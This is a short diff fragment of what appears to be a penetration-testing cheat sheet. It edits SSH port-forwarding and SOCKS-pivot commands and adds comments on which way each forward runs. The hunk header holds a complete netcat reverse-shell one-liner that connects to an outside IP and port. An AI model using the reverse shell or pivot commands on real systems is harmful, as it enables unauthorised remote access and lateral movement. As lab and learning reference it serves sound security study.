@@ -59,8 +59,8 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.14.85.242 9001 >/tmp/f
 # Port-Forwarding ✅
 ## SSH ✡️
 ```bash
-ssh -L 7777:localhost:8888 user@10.10.10.10
-ssh -R 12340:localhost:9999 user@10.10.10.10 # for 
+ssh -L 7777:localhost:80 user@10.10.10.10 # (YOU <-- CLIENT) transfer port from target system to our system
+ssh -R 80:localhost:9999 user@10.10.10.10 # (YOU --> CLIENT) transfer port from our system to target system
 ssh -C2qTnN -D 1080 user@target.host
 ssh -tt -L8080:localhost:8157 solcoteh@10.10.10.10 ssh -t -D 8157 solcoteh@10.10.10.10 -p 222
 -oHostKeyAlgorithms=+ssh-rsa
